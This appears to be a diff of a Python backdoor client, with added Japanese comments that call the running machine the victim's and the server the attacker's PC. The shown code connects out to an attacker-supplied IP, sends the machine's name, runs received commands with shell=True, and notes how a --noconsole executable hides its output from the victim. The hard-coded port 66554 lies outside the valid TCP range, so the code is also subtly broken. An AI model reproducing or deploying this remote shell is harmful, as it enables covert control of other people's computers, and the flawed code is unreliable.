@@ -5,6 +5,7 @@ IP = 'input server ip addr'
 def command_execute(command):
     try:
         result = subprocess.check_output(command, shell=True)
+        #一応ここでコマンド実行結果を被害者側でも出力しています。ただし、PyInstaller等でexe化する際に「--noconsole」等とコンソールを隠す設定をつけていると表示されません。
         print(result.decode('shift-jis'))
         return result
     except:
@@ -14,7 +15,9 @@ while True:
     try:
         #Socket生成
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            #加害者側PCに接続
             s.connect((IP, 66554))
+            #自分のPC名を取得後加害者側に送信
             data = subprocess.check_output('echo %computername%', shell=True)
             s.sendall(data)
             while True:
